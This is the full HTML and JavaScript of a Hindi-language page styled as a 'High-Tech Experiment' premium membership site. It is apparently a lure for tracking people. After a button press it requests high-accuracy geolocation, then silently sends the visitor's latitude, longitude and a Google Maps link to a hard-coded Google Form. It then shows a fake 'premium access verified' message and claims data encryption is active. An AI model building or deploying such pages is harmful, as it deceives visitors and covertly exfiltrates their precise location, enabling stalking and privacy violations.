<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>High-Tech Tech Experiment | Premium Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0a0e17;
            --primary-color: #00f2fe;
            --text-color: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.03);
            --border-color: rgba(0, 242, 254, 0.2);
            --header-height: 80px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: smooth; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            overflow-x: hidden;
        }

        .diamond-bg {
            position: fixed; top: -10%; right: -10%; width: 50%; height: 60%;
            background: linear-gradient(135deg, var(--primary-color) 0%, transparent 70%);
            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
            opacity: 0.05; z-index: -1;
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }

        header {
            height: var(--header-height);
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            position: fixed; width: 100%; top: 0; z-index: 1000;
            display: flex; align-items: center;
        }

        nav { width: 100%; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary-color); text-decoration: none; text-shadow: 0 0 10px var(--primary-color); }

        .nav-links { display: flex; list-style: none; gap: 30px; }
        .nav-links a { text-decoration: none; color: var(--text-color); font-size: 0.9rem; opacity: 0.8; transition: 0.3s; }
        .nav-links a:hover { color: var(--primary-color); opacity: 1; }

        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding-top: var(--header-height); }
        .hero-content h1 { font-size: 3.5rem; background: linear-gradient(to right, #fff, var(--primary-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }

        .premium-btn {
            background: transparent; border: 2px solid var(--primary-color); color: var(--primary-color);
            padding: 15px 40px; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.5s; border-radius: 5px;
        }
        .premium-btn:hover { background: var(--primary-color); color: #000; box-shadow: 0 0 30px var(--primary-color); }

        .features { padding: 100px 0; }
        .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .feature-card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 40px; border-radius: 10px; transition: 0.4s; }
        .feature-card:hover { border-color: var(--primary-color); transform: translateY(-5px); }

        #status-message { margin-top: 20px; font-weight: 500; }
        .hidden { display: none; }

        @media (max-width: 768px) { .nav-links { display: none; } .hero-content h1 { font-size: 2.2rem; } }
    </style>
</head>
<body>

    <div class="diamond-bg"></div>

    <header>
        <div class="container">
            <nav>
                <a href="#" class="logo">HIGH-TECH</a>
                <ul class="nav-links">
                    <li><a href="#home">Home</a></li>
                    <li><a href="#features">Experiments</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <section id="home" class="hero">
        <div class="container hero-content">
            <h1>New Membership <br> High-Tech Experiment</h1>
            <p style="margin-bottom: 30px; opacity: 0.7;">प्रीमियम एक्सेस के लिए नीचे बटन दबाएं।</p>
            <button class="premium-btn" onclick="startExperiment()">प्रवेश करें</button>
            <div id="status-message" class="hidden"></div>
        </div>
    </section>

    <section id="features" class="features">
        <div class="container">
            <div class="feature-grid">
                <div class="feature-card"><h3>सिस्टम चेक</h3><p>वेबसाइट की कार्यक्षमता की जांच की जा रही है।</p></div>
                <div class="feature-card"><h3>सुरक्षा</h3><p>डेटा एन्क्रिप्शन सक्रिय है।</p></div>
            </div>
        </div>
    </section>

    <script>
        function startExperiment() {
            const status = document.getElementById('status-message');
            status.classList.remove('hidden');
            status.innerText = "कृपया लोकेशन की अनुमति (Allow) दें...";
            status.style.color = "white";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, handleError, { enableHighAccuracy: true });
            } else {
                status.innerText = "Browser not supported.";
            }
        }

        function sendData(position) {
            const status = document.getElementById('status-message');
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;

            // --- आपकी फोटो से ली गई असली IDs ---
            const formID = "1ZB-62ZH138zFuJ21LyiiwwOeD9rVstUVdGiiToC4-A";
            const entryLat = "entry.1723883741";
            const entryLon = "entry.1285934641";
            const entryMap = "entry.630484221";

            const finalURL = `https://docs.google.com/forms/d/e/${formID}/formResponse`;

            const formData = new FormData();
            formData.append(entryLat, lat);
            formData.append(entryLon, lon);
            formData.append(entryMap, mapURL);

            fetch(finalURL, { method: "POST", mode: "no-cors", body: formData })
            .then(() => {
                status.innerText = "सफलता! आपका प्रीमियम एक्सेस वेरीफाई हो गया है।";
                status.style.color = "#00ff00";
                alert("Welcome to Premium Access!");
            }).catch(() => {
                status.innerText = "Error sending data.";
            });
        }

        function handleError(error) {
            const status = document.getElementById('status-message');
            status.style.color = "red";
            status.innerText = "अनुमति नहीं मिली। कृपया सेटिंग से लोकेशन ऑन करें।";
        }
    </script>
</body>
</html>
